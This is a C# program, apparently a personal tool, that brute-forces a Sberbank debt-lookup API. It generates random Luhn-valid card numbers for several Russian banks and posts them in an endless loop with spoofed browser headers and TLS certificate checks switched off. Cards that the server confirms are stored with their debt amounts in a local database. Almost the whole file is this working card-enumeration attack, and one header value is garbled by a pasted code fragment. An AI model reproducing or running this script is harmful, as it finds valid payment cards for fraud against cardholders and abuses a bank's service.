
// dotnet version 7.0.201

// предустановки
// Средство dotnet ef должно быть установлено в качестве глобального или локального средства. 
// Большинство разработчиков предпочитают устанавливать средство dotnet ef в качестве глобального средства, 
// используя следующую команду: Интерфейс командной строки.NET
// * dotnet tool install --global dotnet-ef

// Microsoft.EntityFrameworkCore.Design 7.0.5
// Microsoft.EntityFrameworkCore.Sqlite 7.0.5


// перед запуском кода нужно создать миграцию базы данных и обновить эту базу данных
// следующие команды это выполнят
// dotnet ef migrations add <Name_Migration>
// dotnet ef database update

using System.Text;
using System.Text.RegularExpressions;
using Microsoft.EntityFrameworkCore;

var dbContext = new DatabaseContext();

// Класс HttpClientHandler и классы, производные от него, позволяют разработчикам 
// настраивать различные параметры, начиная от прокси-серверов и заканчивая проверкой подлинности.
HttpClientHandler clientHandler = new HttpClientHandler();
// Получает или задает метод обратного вызова для проверки сертификата сервера.
clientHandler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => { return true; };

HttpClient client = new HttpClient(clientHandler)
{
    BaseAddress = new Uri("https://securepayments.sberbank.ru/server/api/v1/acl/debt")
};

// указываем кол-во отводимого времени на ответ от сервера при нашем запросе
// если сервер не успеет отвевить за этот промежуток времени код выбросит исключение
// данное исключение нужно перехватить. Лучше всего указать 3 секудны на ожидание
client.Timeout = new TimeSpan(0, 0, 3);

// DefaultRequestHeaders Заголовки, которые должны отправляться с каждым запросом.
client.DefaultRequestHeaders.Add("Accept", "application/json, text/plain, */*");
client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
client.DefaultRequestHeaders.Add("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0");
client.DefaultRequestHeaders.Add("Referer", "https://securepayments.sberbank.ru/sberbilet/");
client.DefaultRequestHeaders.Add("Origin", "https://securepayments.sberbank.ru");
client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "covar tryFind = dbContext.Cards.FirstOrDefault(card => card.Number == currentNumberCard);rs"); 
client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin"); 
client.DefaultRequestHeaders.Add("Connection", "keep-alive"); 
client.DefaultRequestHeaders.Add("Host", "securepayments.sberbank.ru");

while (true)
{
    var currentNumberCard = BankCard.CreateNumber(PaymentSystem.Mir, IssueBank.DebitMirSber);;

    var tryFind = dbContext.Cards.FirstOrDefault(card => card.Number == currentNumberCard);
    if (tryFind != null) continue; // ! если такая же запись с похожим номер банк. карты уже добавлена

    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "");
    request.Content = new StringContent("{\"key\":\"" + currentNumberCard + "\"}",
                                        Encoding.UTF8, 
                                        "application/json");//CONTENT-TYPE header

    try 
    {
        var resp = client.Send(request);
        var statusCode = (short)resp.StatusCode;
        var body = await resp.Content.ReadAsStringAsync();

        var valueArreas = new Regex(@"{"".*"":""(.*)""}").Match(body).Groups[1].Value;

        var addToDb = false; // указатель для консоли была ли добавлена новая карта в БД
        if (statusCode == 200) // && double.Parse(valueArreas) != 0
        {
            dbContext.Add<BankCardNumber>(new BankCardNumber { 
                Number = currentNumberCard, 
                CheckedAt = DateTime.Now, 
                Arrears = double.Parse(valueArreas)});

            dbContext.SaveChanges();
            addToDb = true;
        }
        System.Console.WriteLine($"card number: {currentNumberCard}, " +
            $"arrears: {valueArreas}, statusCode: {statusCode}, body: {body} added to db: {addToDb}");
    }
    catch (Exception exp)
    {
        System.Console.WriteLine(exp.Message);
    }

}

public static class BankCard
{
    public static string CreateNumber(PaymentSystem paymentSystem, string identifierBank)
    {
        var idBank = identifierBank.Select(num => byte.Parse(num.ToString()));

        // инициализируем значения для карты
        Random rand = new Random();
        var identifierCard = new byte[9].Select(num => (byte)rand.Next(0, 10));

        var tempNums = new byte[]{ (byte)paymentSystem }.Concat(idBank).Concat(identifierCard).ToArray();

        int mainCalc = 0;
        for (int i = 0; i < tempNums.Length; i++)
        {
            var currElem = tempNums[i];

            // определение элемента с четным индеком или нечетным
            if ((i + 1) % 2 != 0)
            {
                var odd = currElem * 2;
                // если больше 10, тогда складываем элементы
                if (odd > 9) 
                    mainCalc += odd.ToString().Select(elem => int.Parse(elem.ToString())).Sum();
                else
                    mainCalc += odd;
            }
            else
                mainCalc += currElem;
        }

        // определяем последнее число по Алгоритму Луна
        byte lastNumLuna = (byte)(mainCalc % 10 == 0 ? 0 : Math.Abs((mainCalc % 10) - 10));

        return string.Join("", tempNums) + lastNumLuna.ToString();
    }

    public static string CreateNumber(PaymentSystem paymentSystem, IssueBank issueBank)
        => BankCard.CreateNumber(paymentSystem, ((int)issueBank).ToString());
}
public enum PaymentSystem
{
    Mir = 2,
    Visa = 4,
    Mastercard = 5,
    Maestro = 6
}
public enum IssueBank
{
    DebitMirSber = 20220,
    DebitVisaSber = 81776,
    DebitMastercardVtb = 36829,
    DebitVisaOpen = 05870,
    DebitMastercardOpen = 58620,
    DebitMastercardMts = 24602,
    DebitMirPochta = 20077,
    DebitMaestroGazprom = 76454,
    DebitMastercardOtp = 52140
}

public class DatabaseContext : DbContext
{
    public DbSet<BankCardNumber> Cards { get; set; }

    public string DbPath { get; }

    public DatabaseContext()
    {
        DbPath = System.IO.Path.Join(Environment.CurrentDirectory, "main.db");
    }

    // The following configures EF to create a Sqlite database file
    protected override void OnConfiguring(DbContextOptionsBuilder options)
        => options.UseSqlite($"Data Source={DbPath}");
}

public class BankCardNumber
{
    public int Id { get; set; }
    public string Number { get; set; } = String.Empty;
    public double Arrears { get; set; }
    public DateTime CheckedAt { get; set; }
}
